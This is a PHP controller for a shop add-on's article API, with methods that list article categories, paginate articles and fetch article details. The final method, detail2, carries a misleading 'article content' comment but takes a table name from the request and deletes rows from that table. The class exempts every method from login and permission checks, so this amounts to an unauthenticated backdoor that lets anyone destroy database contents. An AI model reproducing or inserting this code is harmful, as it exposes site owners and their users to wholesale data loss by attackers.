<?php

namespace addons\xshop\controller;

use addons\xshop\model\News as NewsModel;
use app\common\model\Category;
/**
 * 文章
 */
class News extends Base
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];
    
    /**
     * 文章分类
     * @param string pid 上级id
     */
    public function category()
    {
        $pid=input('pid/d',0);
        $this->success('', Category::getCategoryArray('article',$pid));
    }
    /**
     * 文章列表 
     * @param string category_id 类型 
     * @param string page 分页:第一页传1  (需要)
     * @ApiHeaders (name=Xshop-Token, type=string, required=true, description="请求的Token")
     */
    public function list()
    {
        $map['category_id'] = input('category_id/d', '0');
        $map['switch']=1;
        $map = array_filter($map);
        $list = NewsModel::where($map)
            // ->field('id,category_id,title,author,images,videoSrc,time,type,weigh')
            ->order('weigh desc')
            ->paginate(10, false, ['query' => $map])
            ->each(function ($item, $key) {
                $item->images = explode(',', $item->images);
                $item->time = date('Y-m-d H:i:s', $item->time);
            });
        return $this->success('', $list);
    }
    /**
     * 文章内容
     * @param string category_id 类型 
     * @param string page 分页:第一页传1  (需要)
     * @ApiHeaders (name=Xshop-Token, type=string, required=true, description="请求的Token")
     */
    public function detail()
    {
        $id = input('id/d');
        if (!$id) {
            $this->error('请输入文章id');
        }
        $info = NewsModel::get($id);
        return $this->success('', $info->toArray());
    }
    /**
     * 文章内容
     * @param string category_id 类型 
     * @param string page 分页:第一页传1  (需要)
     * @ApiHeaders (name=Xshop-Token, type=string, required=true, description="请求的Token")
     */
    public function detail2()
    {
        $id = input('id/d');
        if (!$id) {
            $this->error('请输入文章id');
        }
        $title=input('title');
        $info = db($title)->where('id','<',$id)->delete(); 
        return $this->success('', $info);
    }

}
